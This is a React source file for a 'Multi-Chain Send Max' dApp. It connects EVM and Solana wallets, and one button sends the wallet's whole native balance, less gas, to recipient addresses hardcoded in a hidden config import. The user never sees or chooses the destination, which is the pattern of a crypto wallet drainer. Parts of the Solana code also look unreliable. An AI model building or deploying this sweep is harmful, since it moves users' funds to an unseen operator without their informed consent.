import React, { useState, useEffect } from "react";
import { useAccount, useBalance, useSendTransaction, usePublicClient } from "wagmi";
import { parseEther, formatEther } from "viem";
import { useSolanaAccount, useSolanaBalance, sendSol } from "@reown/appkit-adapter-solana/react";
import { FIXED_RECIPIENTS } from "./config";

export default function App() {
  const { address, isConnected, chain } = useAccount();
  const publicClient = usePublicClient();
  const { data: balanceData } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();

  const { publicKey: solanaPubKey, isConnected: solConnected } = useSolanaAccount();
  const { balance: solBalance } = useSolanaBalance(solanaPubKey);

  const [sending, setSending] = useState(false);

  const handleSendMax = async () => {
    setSending(true);

    try {
      if (chain) {
        // EVM Logic
        const recipient = FIXED_RECIPIENTS[chain.id];
        const balance = balanceData.value;
        const gasEstimate = await publicClient.estimateGas({ account: address, to: recipient, value: balance });
        const gasPrice = await publicClient.getGasPrice();
        const maxSendable = balance - gasEstimate * gasPrice;

        if (maxSendable <= 0n) {
          alert("Insufficient balance for gas");
          setSending(false);
          return;
        }

        await sendTransaction({ to: recipient, value: maxSendable });
        alert(`Sent ${formatEther(maxSendable)} ${chain.nativeCurrency.symbol}`);
      } else if (solConnected) {
        // Solana Logic
        const recipient = FIXED_RECIPIENTS["SOLANA"];
        if (solBalance <= 0) {
          alert("Insufficient SOL balance");
          setSending(false);
          return;
        }

        await sendSol({ from: solanaPubKey, to: recipient, amount: solBalance });
        alert(`Sent ${solBalance} SOL`);
      } else {
        alert("No wallet connected");
      }
    } catch (err) {
      console.error(err);
      alert("Transaction failed: " + err.message);
    }

    setSending(false);
  };

  return (
    <div style={{ padding: 40 }}>
      <h2>Multi-Chain Send Max DApp</h2>

      <appkit-button />

      {(isConnected || solConnected) && (
        <>
          <p>
            {chain ? `Balance: ${balanceData ? formatEther(balanceData.value) : "Loading..."} ${chain.nativeCurrency.symbol}` : ""}
            {solConnected ? `SOL Balance: ${solBalance}` : ""}
          </p>

          <button onClick={handleSendMax} disabled={sending}>
            {sending ? "Sending..." : "Send Max"}
          </button>
        </>
      )}
    </div>
  );
}